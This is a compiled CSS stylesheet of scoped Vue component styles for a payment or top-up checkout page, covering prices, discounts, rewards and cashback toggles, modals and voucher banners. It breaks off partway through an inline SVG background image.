[dir=ltr] .form-section__price-deducted-rewards[data-v-1a422aba],
[dir=ltr] .form-section__price-discount[data-v-1a422aba],
[dir=ltr] .form-section__price-strikethrough[data-v-1a422aba],
[dir=ltr] .form-section__price[data-v-1a422aba] {
    margin-left: 8px
}

[dir=rtl] .form-section__price-deducted-discount[data-v-1a422aba],
[dir=rtl] .form-section__price-deducted-rewards[data-v-1a422aba],
[dir=rtl] .form-section__price-discount[data-v-1a422aba],
[dir=rtl] .form-section__price-strikethrough[data-v-1a422aba],
[dir=rtl] .form-section__price[data-v-1a422aba] {
    margin-right: 8px
}

[dir=ltr] .form-section__price-deducted-discount[data-v-1a422aba],
[dir=ltr] .form-section__price-deducted-rewards[data-v-1a422aba],
[dir=ltr] .form-section__price-discount[data-v-1a422aba],
[dir=ltr] .form-section__price-strikethrough[data-v-1a422aba],
[dir=ltr] .form-section__price[data-v-1a422aba] {
    text-align: right
}

[dir=rtl] .form-section__price-deducted-discount[data-v-1a422aba],
[dir=rtl] .form-section__price-deducted-rewards[data-v-1a422aba],
[dir=rtl] .form-section__price-discount[data-v-1a422aba],
[dir=rtl] .form-section__price-strikethrough[data-v-1a422aba],
[dir=rtl] .form-section__price[data-v-1a422aba] {
    text-align: left
}

.form-section__price[data-v-1a422aba] {
    font-size: .875rem;
    line-height: 20px
}

.form-section__price-strikethrough[data-v-1a422aba] {
    text-decoration: line-through;
    color: var(--color-light-5)
}

.form-section__price-info[data-v-1a422aba] {
    display: flex;
    flex-wrap: wrap;
    justify-content: flex-end;
    font-size: .625rem
}

.form-section__price-deducted-discount[data-v-1a422aba],
.form-section__price-deducted-rewards[data-v-1a422aba],
.form-section__price-discount[data-v-1a422aba] {
    padding: 0 2px;
    border-radius: 2px
}

.form-section__price-deducted-discount[data-v-1a422aba],
.form-section__price-discount[data-v-1a422aba] {
    color: #08ad36;
    background: var(--color-green-3)
}

.form-section__price-deducted-discount[data-v-1a422aba],
.form-section__price-deducted-rewards[data-v-1a422aba] {
    margin-bottom: 2px
}

.form-section__price-deducted-rewards[data-v-1a422aba] {
    color: var(--color-text-dark);
    background: var(--color-surface-neutral-subdued)
}

.form-section__disabled-pc[data-v-1a422aba] {
    color: var(--color-text-dark);
    padding: 5px 16px 0;
    word-wrap: break-word;
    line-height: 1.5;
    font-size: .75rem;
    font-family: NotoSans-Regular, sans-serif
}

[dir=ltr] .form-section__disabled-pc[data-v-1a422aba] {
    text-align: left
}

[dir=rtl] .form-section__disabled-pc[data-v-1a422aba] {
    text-align: right
}

.form-section__tagline-wrapper[data-v-1a422aba] {
    background-color: #fff;
    color: var(--color-dark-main);
    font-size: .75rem;
    font-family: NotoSans-Bold, sans-serif;
    padding: 5px 16px;
    border-bottom-left-radius: 6px;
    border-bottom-right-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
    border-top: 1px solid var(--color-light-main)
}

.form-section__tagline-wrapper.show-tagline[data-v-1a422aba] {
    background-color: var(--color-primary-6)
}

.form-section__tagline-wrapper.active[data-v-1a422aba] {
    background-color: var(--color-primary-6);
    border: none;
    border-top: 1px solid var(--color-primary-main)
}

.form-section__surcharge-container[data-v-1a422aba] {
    display: inline-flex;
    align-items: center
}

[dir=ltr] .form-section__surcharge-container[data-v-1a422aba] {
    margin-left: auto
}

[dir=rtl] .form-section__surcharge-container[data-v-1a422aba] {
    margin-right: auto
}

.form-section__tagline-link[data-v-1a422aba] {
    color: var(--color-primary-main);
    height: 16px
}

[dir=ltr] .form-section__tagline-link[data-v-1a422aba] {
    padding-left: 5px
}

[dir=rtl] .form-section__tagline-link[data-v-1a422aba] {
    padding-right: 5px
}

[dir=rtl] .form-section__tagline-link .icon[data-v-1a422aba] {
    transform: rotate(270deg)
}

.form-section__best-deal[data-v-1a422aba] {
    position: absolute;
    top: -1px;
    padding: 1px 4px;
    font-size: .6875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: #fff;
    border-radius: 4px 8px 8px 0;
    background: linear-gradient(90deg, var(--color-green-5), var(--color-green-4));
    width: -webkit-max-content;
    width: max-content;
    text-transform: uppercase
}

[dir=ltr] .form-section__best-deal[data-v-1a422aba] {
    left: -1px
}

[dir=rtl] .form-section__best-deal[data-v-1a422aba] {
    right: -1px;
    border-radius: 8px 4px 0 8px
}

@keyframes fadeIn-data-v-633f07cc {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-633f07cc {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-633f07cc]:export {
    breakpointLg: 992px
}

.switch[data-v-633f07cc] {
    display: inline-block;
    height: 16px;
    position: relative;
    width: 32px
}

.switch input[data-v-633f07cc] {
    display: none
}

.slider[data-v-633f07cc] {
    background-color: #6f6b80;
    bottom: 0;
    cursor: pointer;
    left: 0;
    position: absolute;
    right: 0;
    top: 0;
    transition: .4s
}

.slider.isDisabled[data-v-633f07cc] {
    cursor: not-allowed
}

.slider[data-v-633f07cc]:before {
    background-color: #fff;
    bottom: 1.5px;
    content: "";
    height: 13px;
    left: 2.5px;
    position: absolute;
    transition: .4s;
    width: 13px
}

input:checked+.slider[data-v-633f07cc] {
    background-color: var(--color-primary-main)
}

input:checked+.slider[data-v-633f07cc]:before {
    transform: translateX(14px)
}

.slider.round[data-v-633f07cc] {
    border-radius: 16px
}

.slider.round[data-v-633f07cc]:before {
    border-radius: 50%
}

svg[data-v-2d482b21] {
    cursor: pointer
}

@keyframes fadeIn-data-v-4cf2b9d6 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-4cf2b9d6 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-4cf2b9d6]:export {
    breakpointLg: 992px
}

.use-rewards-info[data-v-4cf2b9d6] {
    font-family: NotoSans-Regular, sans-serif
}

.use-rewards-info__header[data-v-4cf2b9d6] {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%
}

.use-rewards-info__header .icon[data-v-4cf2b9d6] {
    cursor: pointer
}

.use-rewards-info__header .title[data-v-4cf2b9d6] {
    color: #1b191c;
    font-size: 1.25rem;
    text-align: start
}

[dir=ltr] .use-rewards-info__header .title[data-v-4cf2b9d6] {
    margin-right: 5px
}

[dir=rtl] .use-rewards-info__header .title[data-v-4cf2b9d6] {
    margin-left: 5px
}

.use-rewards-info__content[data-v-4cf2b9d6] {
    padding: 16px 16px 0
}

.use-rewards-info__balance[data-v-4cf2b9d6],
.use-rewards-info__conditions[data-v-4cf2b9d6],
.use-rewards-info__expiry[data-v-4cf2b9d6] {
    display: flex;
    flex-direction: column;
    margin-bottom: 20px
}

.use-rewards-info__balance .title[data-v-4cf2b9d6],
.use-rewards-info__conditions .title[data-v-4cf2b9d6],
.use-rewards-info__expiry .title[data-v-4cf2b9d6] {
    font-size: 1rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-text-dark-heading);
    margin-bottom: 5px
}

.use-rewards-info__balance .desc[data-v-4cf2b9d6],
.use-rewards-info__conditions .desc[data-v-4cf2b9d6],
.use-rewards-info__expiry .desc[data-v-4cf2b9d6] {
    font-size: .875rem;
    color: var(--color-text-dark)
}

.use-rewards-info__balance .amount[data-v-4cf2b9d6],
.use-rewards-info__conditions .amount[data-v-4cf2b9d6],
.use-rewards-info__expiry .amount[data-v-4cf2b9d6] {
    font-size: 1.25rem;
    font-family: NotoSans-SemiBold, sans-serif
}

.use-rewards-info__balance .date[data-v-4cf2b9d6],
.use-rewards-info__conditions .date[data-v-4cf2b9d6],
.use-rewards-info__expiry .date[data-v-4cf2b9d6] {
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-text-dark);
    margin-bottom: 5px
}

@keyframes fadeIn-data-v-7f2f69fa {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-7f2f69fa {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-7f2f69fa]:export {
    breakpointLg: 992px
}

.use-cashback-container[data-v-7f2f69fa] {
    width: 100%;
    background-color: var(--color-surface-neutral-subdued);
    color: var(--color-dark-main);
    padding: 10px 15px
}

.use-cashback-container.widget[data-v-7f2f69fa] {
    padding: 11px 15px
}

.use-cashback-container.no-balance[data-v-7f2f69fa] {
    background-color: var(--color-light-main)
}

.use-cashback-container.widget .use-cashback__header--title .text[data-v-7f2f69fa] {
    font-family: NotoSans-Regular, sans-serif
}

.use-cashback-container.widget.no-balance[data-v-7f2f69fa] {
    background-color: var(--color-surface-neutral-subdued)
}

.use-cashback-container.widget.no-balance .use-cashback__icon[data-v-7f2f69fa] {
    filter: grayscale(100%)
}

.use-cashback-container.widget.no-balance .use-cashback__header[data-v-7f2f69fa] {
    margin-bottom: 0
}

.use-cashback-container.widget.no-balance .use-cashback__header--toggle .container[data-v-7f2f69fa] {
    display: flex
}

.use-cashback-container.widget.no-balance .use-cashback__details[data-v-7f2f69fa] {
    justify-content: center
}

.use-cashback-wrapper[data-v-7f2f69fa] {
    display: flex
}

.use-cashback__icon[data-v-7f2f69fa] {
    flex: 0 0 auto;
    display: inline-flex
}

[dir=ltr] .use-cashback__icon[data-v-7f2f69fa] {
    margin-right: 10px
}

[dir=rtl] .use-cashback__icon[data-v-7f2f69fa] {
    margin-left: 10px
}

.use-cashback__details[data-v-7f2f69fa] {
    display: flex;
    flex: 1;
    flex-direction: column
}

.use-cashback__header[data-v-7f2f69fa] {
    display: flex;
    align-items: center;
    margin-bottom: 6px;
    font-size: .875rem;
    justify-content: space-between
}

.use-cashback__header--title[data-v-7f2f69fa] {
    display: flex;
    align-items: flex-start
}

.use-cashback__header--title .text.active[data-v-7f2f69fa] {
    font-family: NotoSans-SemiBold, sans-serif
}

.use-cashback__header--title .icon[data-v-7f2f69fa] {
    width: 16px;
    height: 16px;
    display: inline-flex;
    cursor: pointer
}

[dir=ltr] .use-cashback__header--title .icon[data-v-7f2f69fa] {
    margin-left: 5px
}

[dir=rtl] .use-cashback__header--title .icon[data-v-7f2f69fa] {
    margin-right: 5px
}

.use-cashback__header--title.bold[data-v-7f2f69fa] {
    font-family: NotoSans-SemiBold, sans-serif
}

[dir=ltr] .use-cashback__header--toggle[data-v-7f2f69fa] {
    margin-left: auto
}

[dir=rtl] .use-cashback__header--toggle[data-v-7f2f69fa] {
    margin-right: auto
}

.use-cashback__header--cashback[data-v-7f2f69fa] {
    font-size: .75rem;
    font-family: NotoSans-Bold, sans-serif;
    color: var(--color-green-5);
    line-height: 18px
}

.use-cashback__info[data-v-7f2f69fa] {
    display: flex;
    align-items: center;
    font-size: .75rem;
    justify-content: space-between
}

.use-cashback__info--expiry[data-v-7f2f69fa] {
    color: var(--color-light-5)
}

.use-cashback__info--expiry.expire-soon[data-v-7f2f69fa] {
    color: #ee3131
}

.use-cashback__info--reward[data-v-7f2f69fa] .amount-off {
    font-family: NotoSans-Bold, sans-serif
}

.use-cashback__info--reward.active[data-v-7f2f69fa] {
    color: #08ad36
}

.use-cashback__no-balance[data-v-7f2f69fa] {
    display: flex;
    align-items: center;
    font-size: .75rem
}

.use-cashback__no-balance .text[data-v-7f2f69fa] {
    color: var(--color-text-dark)
}

.use-cashback__no-balance .icon[data-v-7f2f69fa] {
    width: 16px;
    height: 17px;
    cursor: pointer
}

[dir=ltr] .use-cashback__no-balance .icon[data-v-7f2f69fa] {
    margin-left: 5px
}

[dir=rtl] .use-cashback__no-balance .icon[data-v-7f2f69fa] {
    margin-right: 5px
}

.use-cashback__action[data-v-7f2f69fa] {
    margin: 15px 10px 5px
}

.use-cashback__action button[data-v-7f2f69fa] {
    padding: 6px
}

@keyframes fadeIn-data-v-61040bc5 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-61040bc5 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-61040bc5]:export {
    breakpointLg: 992px
}

.svg-white path[data-v-61040bc5] {
    fill: var(--color-light-main)
}

.svg-dark path[data-v-61040bc5] {
    fill: var(--color-dark-main)
}

@keyframes fadeIn-data-v-6530b15f {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-6530b15f {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-6530b15f]:export {
    breakpointLg: 992px
}

.fade-enter-active[data-v-6530b15f],
.fade-leave-active[data-v-6530b15f] {
    transition: opacity .5s
}

.fade-enter[data-v-6530b15f],
.fade-leave-to[data-v-6530b15f] {
    opacity: 0
}

.modal-backdrop[data-v-6530b15f] {
    background-color: rgba(0, 0, 0, .5);
    position: fixed;
    top: 0;
    width: 100%;
    height: 100%;
    z-index: 10;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: scroll
}

[dir=ltr] .modal-backdrop[data-v-6530b15f] {
    left: 0
}

[dir=rtl] .modal-backdrop[data-v-6530b15f] {
    right: 0
}

.modal-container[data-v-6530b15f] {
    font-family: NotoSans-Regular, sans-serif;
    background-color: #fff;
    color: var(--color-dark-main);
    min-width: 90vw;
    max-width: 720px;
    width: auto;
    margin: auto 15px;
    position: relative;
    border-radius: 20px;
    font-size: .875rem
}

.modal-header[data-v-6530b15f] {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-top-left-radius: 20px;
    border-top-right-radius: 20px;
    padding: 15px 12px;
    background-color: var(--color-dark-main);
    color: #fff
}

.modal-header.custom[data-v-6530b15f] {
    background: #fff
}

.modal-header-image[data-v-6530b15f] {
    width: 100%;
    height: auto;
    max-height: 160px;
    -o-object-fit: cover;
    object-fit: cover;
    border-top-left-radius: 20px;
    border-top-right-radius: 20px
}

.modal-header__title[data-v-6530b15f] {
    margin: 0;
    font-size: 1.125rem;
    font-family: NotoSans-Bold, sans-serif
}

.modal-header__container[data-v-6530b15f] {
    display: flex;
    align-items: center
}

[dir=ltr] .modal-header__container__logo[data-v-6530b15f] {
    margin-right: 10px
}

[dir=rtl] .modal-header__container__logo[data-v-6530b15f] {
    margin-left: 10px
}

.modal-header__container__title[data-v-6530b15f] {
    font-size: .875rem
}

.modal-header-close[data-v-6530b15f] {
    opacity: .5
}

.modal-body[data-v-6530b15f] {
    padding: 15px 12px;
    overflow-y: auto;
    height: 100%;
    max-height: 500px
}

.modal-body[data-v-6530b15f] ul {
    padding-left: 25px;
    padding-right: 25px
}

.modal-body[data-v-6530b15f] a {
    color: var(--color-primary-main)
}

.modal-body[data-v-6530b15f] b {
    font-family: NotoSans-Bold, sans-serif
}

.modal-footer[data-v-6530b15f] {
    border-bottom-left-radius: 20px;
    border-bottom-right-radius: 20px;
    display: flex;
    flex-wrap: wrap;
    justify-content: flex-end;
    padding: 12px;
    background: #fff;
    box-shadow: 0 2px 5px 0 rgba(51, 51, 51, .509804)
}

.modal-footer.centered[data-v-6530b15f] {
    justify-content: center
}

@media screen and (min-width:576px) {
    .modal-container[data-v-6530b15f] {
        min-width: 65vw
    }
}

@media screen and (min-width:768px) {
    .modal-container[data-v-6530b15f] {
        min-width: 575px
    }

    .modal-body[data-v-6530b15f],
    .modal-footer[data-v-6530b15f],
    .modal-header[data-v-6530b15f] {
        padding: 15px 20px
    }

    .modal-body[data-v-6530b15f] {
        max-height: 700px
    }
}

@keyframes fadeIn-data-v-ca4aee8c {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-ca4aee8c {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-ca4aee8c]:export {
    breakpointLg: 992px
}

.form-section__container .btn-show-suggest-panel[data-v-ca4aee8c] {
    color: var(--color-primary-main);
    font-size: .875rem;
    text-decoration: underline;
    cursor: pointer
}

.form-section__container[data-v-ca4aee8c] {
    background-color: #fff;
    border-radius: 6px;
    padding: 15px;
    margin: 25px 0;
    animation: fadeIn-data-v-ca4aee8c 1s ease;
    position: relative
}

.form-section__rewards[data-v-ca4aee8c] {
    margin: 15px -15px auto
}

.form-section__name[data-v-ca4aee8c] {
    margin-top: 18px;
    color: var(--color-dark-main);
    max-width: 220px
}

[dir=ltr] .form-section__name[data-v-ca4aee8c] {
    margin-left: 50px
}

[dir=rtl] .form-section__name[data-v-ca4aee8c] {
    margin-right: 50px
}

.form-section__name-hide-index[data-v-ca4aee8c] {
    margin-top: 18px;
    color: var(--color-dark-main)
}

.form-section__circle[data-v-ca4aee8c] {
    flex-wrap: wrap;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin: -30px 0 0;
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px
}

.form-section__number[data-v-ca4aee8c] {
    border: 4px solid #fff;
    border-radius: 50%;
    margin: 0;
    position: absolute;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    line-height: 36px;
    width: 46px;
    height: 46px;
    text-align: center;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important;
    background-color: var(--color-primary-main);
    color: #fff
}

.form-section__formGroup--paymentChannels[data-v-ca4aee8c] {
    padding: 5px 0 0;
    margin: 0;
    list-style: none
}

.form-section__title-container[data-v-ca4aee8c] {
    display: flex
}

.form-section__invalid[data-v-ca4aee8c] {
    align-self: flex-end;
    font-family: NotoSans-Regular, sans-serif
}

[dir=ltr] .form-section__invalid[data-v-ca4aee8c] {
    margin-left: 50px
}

[dir=rtl] .form-section__invalid[data-v-ca4aee8c] {
    margin-right: 50px
}

.form-section__show-more[data-v-ca4aee8c] {
    display: block;
    width: 100%
}

@media screen and (min-width:768px) {
    .form-section__name[data-v-ca4aee8c] {
        max-width: 98%
    }

    [dir=ltr] .form-section__invalid[data-v-ca4aee8c] {
        margin-left: 0
    }

    [dir=rtl] .form-section__invalid[data-v-ca4aee8c] {
        margin-right: 0
    }

    .form-section__show-more[data-v-ca4aee8c] {
        display: flex;
        width: 40%
    }

    [dir=ltr] .form-section__show-more[data-v-ca4aee8c] {
        margin-right: auto
    }

    [dir=rtl] .form-section__show-more[data-v-ca4aee8c] {
        margin-left: auto
    }

    [dir=ltr] .form-section__show-more>#show-more-pc[data-v-ca4aee8c] {
        margin-left: 0
    }

    [dir=rtl] .form-section__show-more>#show-more-pc[data-v-ca4aee8c] {
        margin-right: 0
    }
}

@keyframes fadeIn-data-v-722658ba {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-722658ba {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-722658ba]:export {
    breakpointLg: 992px
}

.form-section__container[data-v-722658ba] {
    background-color: #fff;
    border-radius: 6px;
    padding: 15px;
    margin: 25px 0;
    animation: fadeIn-data-v-722658ba 1s ease;
    position: relative
}

.form-section__name[data-v-722658ba] {
    margin-top: 18px;
    color: var(--color-dark-main);
    max-width: 220px
}

[dir=ltr] .form-section__name[data-v-722658ba] {
    margin-left: 50px
}

[dir=rtl] .form-section__name[data-v-722658ba] {
    margin-right: 50px
}

.form-section__circle[data-v-722658ba] {
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin: -30px 0 0;
    display: flex;
    justify-content: space-between
}

.form-section__number[data-v-722658ba] {
    border: 4px solid #fff;
    border-radius: 50%;
    margin: 0;
    position: absolute;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    line-height: 36px;
    width: 46px;
    height: 46px;
    text-align: center;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important;
    background-color: var(--color-primary-main);
    color: #fff
}

.form-section__formGroup[data-v-722658ba] {
    padding: 10px 0 0 0
}

.form-section__billing-address[data-v-722658ba] {
    align-content: center;
    max-width: 100%;
    justify-content: space-between
}

.form-section__billing-address[data-v-722658ba] .dropdown-select__placeholder,
.form-section__billing-address[data-v-722658ba] .dropdown-select__selected-option {
    justify-content: flex-start
}

[dir=ltr] .form-section__billing-address[data-v-722658ba] .dropdown-select__search {
    text-align: left
}

[dir=rtl] .form-section__billing-address[data-v-722658ba] .dropdown-select__search {
    text-align: right
}

.form-section__billing-address[data-v-722658ba] .inline-element {
    width: 50%;
    max-width: 50%;
    vertical-align: top
}

[dir=ltr] .form-section__billing-address[data-v-722658ba] .inline-element {
    text-align: left
}

[dir=rtl] .form-section__billing-address[data-v-722658ba] .inline-element {
    text-align: right
}

.form-section__billing-address>[data-v-722658ba]:nth-of-type(5) {
    padding: 0
}

.form-section__subheader[data-v-722658ba] {
    font-size: .875rem;
    color: var(--color-dark-main);
    padding: 5px 0;
    margin: 0;
    display: block;
    overflow-wrap: break-word
}

@media screen and (min-width:768px) {
    .form-section__name[data-v-722658ba] {
        max-width: 98%
    }
}

@keyframes fadeIn-data-v-f3c8e404 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-f3c8e404 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-f3c8e404]:export {
    breakpointLg: 992px
}

.voucher[data-v-f3c8e404] {
    font-family: NotoSans-Regular, sans-serif;
    color: var(--color-dark-main);
    margin-top: 25px
}

.voucher strong[data-v-f3c8e404] {
    font-family: NotoSans-SemiBold, sans-serif
}

.voucher a[data-v-f3c8e404] {
    display: block;
    font-family: var(--font-family-primary);
    color: var(--color-primary-3);
    text-decoration: underline
}

.voucher__info-box[data-v-f3c8e404] {
    background: linear-gradient(180deg, rgba(240, 99, 131, .25), rgba(98, 66, 252, .25));
    display: flex;
    flex-flow: row nowrap;
    padding: 20px 16px 16px;
    position: relative;
    border: 1px solid var(--color-dark-3);
    border-radius: 8px;
    color: var(--color-light-main)
}

.voucher__info-box__chip[data-v-f3c8e404] {
    position: absolute;
    top: -14px;
    padding: 2px 6px;
    border-radius: 8px 8px 8px 0;
    font-size: .875rem;
    background: var(--color-tertiary-1);
    text-transform: uppercase;
    font-family: NotoSans-SemiBold, sans-serif
}

[dir=ltr] .voucher__info-box__chip[data-v-f3c8e404] {
    left: 0
}

[dir=rtl] .voucher__info-box__chip[data-v-f3c8e404] {
    right: 0;
    border-radius: 8px 8px 0 8px
}

[dir=ltr] .voucher__info-box__col1[data-v-f3c8e404] {
    margin-right: 16px
}

[dir=rtl] .voucher__info-box__col1[data-v-f3c8e404] {
    margin-left: 16px
}

.voucher__info-box__col1 img[data-v-f3c8e404] {
    height: 44px
}

.voucher__info-box__heading[data-v-f3c8e404] {
    font-size: 1rem;
    font-family: NotoSans-SemiBold, sans-serif
}

.voucher__info-box__text[data-v-f3c8e404] {
    font-size: .875rem
}

.voucher__info-box__link[data-v-f3c8e404] {
    margin-top: 4px;
    font-size: 1rem;
    font-family: NotoSans-SemiBold, sans-serif
}

.voucher__info-box-icon[data-v-f3c8e404],
.voucher__info-box-text[data-v-f3c8e404] {
    padding: 8px
}

.voucher .voucher-page-link[data-v-f3c8e404] {
    display: block;
    width: -webkit-max-content;
    width: max-content;
    font-size: .875rem;
    background: var(--color-secondary-main);
    color: var(--color-text-dark-heading);
    padding: 6px 14px;
    border-radius: 100px;
    margin: 8px 0 0;
    text-decoration: none
}

@keyframes fadeIn-data-v-30bb0a50 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-30bb0a50 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-30bb0a50]:export {
    breakpointLg: 992px
}

.icon-color--portal[data-v-30bb0a50] {
    color: var(--color-primary-main)
}

.icon-color--smoke[data-v-30bb0a50] {
    color: var(--color-light-main)
}

.icon-color--black[data-v-30bb0a50] {
    color: #6f6b80
}

@keyframes fadeIn-data-v-3b158af1 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-3b158af1 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-3b158af1]:export {
    breakpointLg: 992px
}

.cashback-banner[data-v-3b158af1] {
    margin: 30px auto;
    border: 1px solid var(--color-dark-main);
    border-radius: 8px;
    cursor: pointer;
    background: linear-gradient(1deg, rgba(60, 31, 66, 0), rgba(240, 99, 131, .2)), linear-gradient(179deg, rgba(59, 17, 181, 0), rgba(98, 66, 252, .2)), var(--color-dark-4)
}

.cashback-banner__wrapper[data-v-3b158af1] {
    display: flex;
    align-items: center
}

.cashback-banner__img[data-v-3b158af1] {
    padding: 15px 10px 5px
}

.cashback-banner__arrow[data-v-3b158af1] {
    color: #fff;
    padding: 20px
}

[dir=ltr] .cashback-banner__arrow[data-v-3b158af1] {
    margin-left: auto
}

[dir=rtl] .cashback-banner__arrow[data-v-3b158af1] {
    margin-right: auto;
    transform: rotate(180deg)
}

.cashback-banner__text[data-v-3b158af1] {
    font-family: NotoSans-SemiBold, sans-serif;
    color: var(--color-secondary-main);
    font-size: .875rem;
    line-height: 18px
}

.cashback-banner__badge[data-v-3b158af1] {
    position: absolute;
    background: var(--color-tertiary-1);
    font-family: NotoSans-Bold, sans-serif;
    color: #fff;
    font-size: .75rem;
    line-height: 18px;
    padding: 4px 6px;
    text-transform: uppercase;
    transform: translateY(-50%);
    border-radius: 8px 8px 8px 0
}

[dir=rtl] .cashback-banner__badge[data-v-3b158af1] {
    border-radius: 8px 8px 0 8px
}

@keyframes fadeIn-data-v-1e67f328 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-1e67f328 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-1e67f328]:export {
    breakpointLg: 992px
}

.get-guest-uid[data-v-1e67f328] {
    position: relative;
    margin-top: 30px
}

.get-guest-uid__wrapper[data-v-1e67f328] {
    padding: 16px;
    display: flex;
    flex-direction: column;
    background-color: var(--color-surface-neutral-subdued);
    border-radius: 0 0 8px 8px
}

.get-guest-uid__wrapper.non-rewards[data-v-1e67f328] {
    background-color: #f6f5fc;
    border-radius: 8px;
    border: 1px solid var(--color-light-2)
}

.get-guest-uid__ornament[data-v-1e67f328] {
    display: inline-flex;
    height: 10px;
    position: absolute;
    left: 0;
    right: 0;
    top: -10px;
    border-radius: 10px 10px 0 0;
    background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg width='787' height='22' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cg clip-path='url(%23clip0_1265_191915)'%3E%3Cpath d='M-60.665-56.481l1.522 2.882.425 2.9.768 2.895 1.264 2.883.253 2.906.534 2.897.657 2.896.99 2.89.468 2.9 1.576 2.88.586 2.897.729 2.895.31 2.902.724 2.895 1.185 2.887.325 2.901.464 2.9 1.687 2.877-.153 2.91.932 2.89 1.459 2.883.438 2.9-1.88 1.604.344 7.698 1.707 5.784 1.276 7.239 2.981 1.97 2.34 2.216-.605 3.546-3.745.334.38 1.624 3.79 8.583-.327 5.9 3.314 5.676 6.944 6.931.328 4.555 1.272 5.792.517 2.898 2.132 5.776-.547 6.616.14 2.536-.598 2.69-.132 2.12 2.935 5.049 1.782 5.161.983 2.847 3.363 1.912 4.869 4.386-2.38 7.199.52 2.899 1.69 2.877 1.305 7.217 2.841 3.287-.658-4.089 1.427-2.405 2.187-2.045 1.243-2.489 1.897-2.182 2.203-2.04.775-2.708 2.097-2.091 2.26-2.012.83-2.683 1.98-2.144 1.772-2.206-.977-2.857-1.397-2.864-.355-2.924-.594-2.909-1.335-2.867-1.466-2.86-.052-2.94-1.657-2.848-1.18-2.875-.38-2.92-.635-2.909-2.073-2.824-.315-2.925-1.022-2.885-1.14-2.877-1.335-2.869-.743-2.9-.83-2.896-.73-2.901-1.597-2.851-.38-2.92-.584-2.91-1.414-2.86-1.472-2.859-.887-2.892-.678-2.904-1.4-2.862.016-2.944-1.108-2.879-1.185-2.875-1.351-2.865-.82-2.895-.958-2.888-.502-2.913-1.003-2.886-1.47-2.858-.626-2.177 1.835.765L-3.55 35.79 5.08 39.25l7.194-14.378L3.163 5.468l-11.33-17.715-16.36 1.72s6.138 5.343 6.138 6.354l-7.553-1.109-1.809.257-.104-.307-.88-2.893-.964-2.887-.986-2.887-.615-2.907-1.38-2.864-1.202-2.874-.752-2.9-1.326-2.866-.312-2.925-1.69-2.846-.4-2.92-.801-2.897-.71-2.902-1.032-2.882-1.33-2.898-3.039-1.933-3.501-1.416-2.644-2.263-3.391-1.522-2.836-2.072-3.772-1.846.753 3.25z' fill='%23E8F953'/%3E%3Cpath d='M-67.665-55.481l1.522 2.882.425 2.9.768 2.895 1.264 2.883.253 2.906.534 2.897.657 2.896.99 2.89.468 2.9 1.576 2.88.586 2.897.729 2.895.31 2.902.724 2.895 1.185 2.887.325 2.901.464 2.9 1.687 2.877-.153 2.91.932 2.89 1.459 2.883.438 2.9-1.88 1.604.344 7.698 1.707 5.784 1.276 7.239 2.981 1.97 2.34 2.216-.605 3.546-3.745.334.38 1.624 3.79 8.583-.327 5.9 3.314 5.676 6.944 6.931.328 4.555 1.272 5.792.517 2.898 2.132 5.776-.547 6.616.14 2.536-.598 2.69-.132 2.12 2.935 5.049 1.782 5.161.983 2.847 3.363 1.912 4.869 4.386-2.38 7.199.52 2.899 1.69 